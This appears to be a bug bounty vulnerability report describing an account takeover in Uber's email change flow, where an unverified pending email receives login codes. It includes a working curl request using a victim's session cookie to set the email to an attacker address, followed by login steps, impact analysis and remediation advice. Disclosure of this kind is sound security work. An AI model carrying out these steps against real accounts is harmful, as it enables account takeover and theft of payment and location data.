# HackerOne Report: Account Takeover via Email Change Without Verification

## Title
Account Takeover via Unverified Email Change - OTP Sent to Pending (Unverified) Email

## Weakness
- Improper Authentication (CWE-287)
- Missing Authentication for Critical Function (CWE-306)
- Broken Access Control

## Severity
**Critical**

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Score: 8.8 - 9.8

## Description

A critical account takeover vulnerability exists in Uber's email change and authentication flow. When a user changes their email address via the `/api/updateUserInfo` endpoint, the new email is set to a "PENDING" (unverified) status. However, this pending email can immediately be used to receive authentication OTP codes, allowing an attacker to take over any account they have temporary session access to.

### The Vulnerability

1. Email changes do not require verification from the current email
2. The new email is set to `verificationStatus: PENDING`
3. Despite being unverified, OTP codes for login are sent to the PENDING email
4. An attacker can complete login using only the unverified attacker-controlled email

## Steps to Reproduce

### Prerequisites
- Access to a victim's authenticated session (via XSS, session hijacking, shared device, etc.)
- An attacker-controlled email address

### Step 1: Change Email via API

Using the victim's session cookies, make the following API call:

```bash
curl -X POST 'https://account.uber.com/api/updateUserInfo?localeCode=en' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: sid=[VICTIM_SESSION_COOKIE]' \
  -d '{
    "userInfoUpdate": {
      "userInfoUpdateType": "EMAIL",
      "email": {
        "emailAddress": "attacker@evil.com"
      }
    }
  }'
```

### Step 2: Observe Response

The API returns success with the email in PENDING status:

```json
{
  "status": "success",
  "data": {
    "ok": true,
    "userInfo": {
      "email": {
        "emailAddress": "attacker@evil.com"
      },
      "emailAttributes": {
        "verificationStatus": "PENDING"
      }
    }
  }
}
```

### Step 3: Login with Attacker Email

1. Navigate to https://auth.uber.com
2. Enter the attacker-controlled email: `attacker@evil.com`
3. Complete the CAPTCHA challenge
4. Observe: Uber shows **"Welcome back, [Victim's Name]"**
5. Uber states: **"Enter the 4-digit code sent to you at: attacker@evil.com"**

### Step 4: Receive OTP at Attacker Email

Check the attacker's email inbox. An email from `admin@uber.com` with subject "Your Uber account verification code" contains a 4-digit OTP.

### Step 5: Complete Login

Enter the OTP code. The attacker is now fully logged into the victim's account with complete access to:
- Book rides using victim's payment methods
- View ride history and saved locations
- Access payment information
- Modify account settings
- Perform any account action

## Impact

### Critical Impact
This vulnerability allows **complete account takeover** of any Uber user account. The attacker gains:

1. **Financial Control**: Book rides charged to victim's payment methods
2. **Privacy Breach**: Access to ride history, home/work addresses, contact information
3. **Persistent Access**: Victim cannot recover account without Uber support
4. **No Notification**: Victim receives minimal/no notification of the takeover

### Attack Scenarios

**Scenario 1 - XSS to ATO**: An attacker exploits any XSS vulnerability to steal session tokens, then uses this vulnerability to permanently take over the account.

**Scenario 2 - Shared Device**: Attacker with brief access to victim's logged-in device can quickly change email and later access the account remotely.

**Scenario 3 - Insider Threat**: Support staff or employees with session access can escalate to full account control.

### Affected Users
- All Uber users globally (Riders and Drivers)
- Business accounts
- Uber for Business users

## Proof of Concept Video/Screenshots

[Evidence from testing on my own account:]

1. **Before**: Account email was `sgbusrqg@sharklasers.com`, account name "Aynorica Tester"
2. **API Call**: Changed email to `ubertestp0c@guerrillamail.com`
3. **Response**: Email status = "PENDING" (unverified)
4. **Login Page**: Shows "Welcome back, Aynorica" with OTP request to attacker email
5. **OTP Received**: Code `0618` received at attacker email
6. **Full Access**: Logged into account at m.uber.com with full functionality

## Suggested Remediation

### Immediate (Critical Priority)
1. **Require email verification** before any authentication can occur on a new email
2. **Send security alert** to the original email when email change is initiated
3. **Implement 24-48 hour cooling-off period** before new email can be used for auth

### Short-term
4. **Require step-up authentication** for email changes (password or existing 2FA)
5. **Rate limit** email change attempts per account
6. **Enhanced logging/alerting** for email change patterns

### Long-term
7. Only allow **verified emails** to receive OTP codes
8. Implement **account recovery verification** with multiple factors
9. Consider **FIDO2/Passkey** as primary authentication method

## Supporting Materials

- Finding documentation: `/uber-recon/findings/2025-12-06-account-takeover-email-change.md`
- API endpoint: `POST https://account.uber.com/api/updateUserInfo?localeCode=en`
- Tested on: account.uber.com, auth.uber.com, m.uber.com

---

**Note**: This vulnerability was discovered and tested on my own test accounts. No unauthorized access to any real user accounts was attempted.
